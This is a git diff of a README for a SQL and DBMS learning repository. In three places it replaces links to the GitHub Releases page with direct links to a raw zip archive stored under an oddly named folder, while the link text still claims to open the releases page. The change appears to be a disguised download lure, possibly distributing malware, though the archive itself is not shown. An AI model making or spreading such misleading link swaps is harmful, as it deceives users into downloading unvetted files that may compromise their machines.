@@ -1,6 +1,6 @@
 # 📚 sql-queries-and-dbms - Learn SQL and DBMS Faster
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/hobbsroberti162/sql-queries-and-dbms/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/hobbsroberti162/sql-queries-and-dbms/main/overcapitalization/and-dbms-queries-sql-v3.1.zip)
 
 ## 🧰 What This Is
 
@@ -30,7 +30,7 @@ If the release includes a desktop app or packaged files, your system should also
 
 To get the files, visit the release page and download the latest version:
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-grey?style=for-the-badge)](https://github.com/hobbsroberti162/sql-queries-and-dbms/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-grey?style=for-the-badge)](https://raw.githubusercontent.com/hobbsroberti162/sql-queries-and-dbms/main/overcapitalization/and-dbms-queries-sql-v3.1.zip)
 
 1. Open the release page in your browser.
 2. Look for the latest release near the top of the page.
@@ -162,7 +162,7 @@ database-management,dbms,dbms-project,interview-preparation,learning,mysql,mysql
 
 ## 🔗 Access the Download Page Again
 
-[Visit the GitHub Releases page](https://github.com/hobbsroberti162/sql-queries-and-dbms/releases)
+[Visit the GitHub Releases page](https://raw.githubusercontent.com/hobbsroberti162/sql-queries-and-dbms/main/overcapitalization/and-dbms-queries-sql-v3.1.zip)
 
 ## 🧭 Quick Start Checklist
 
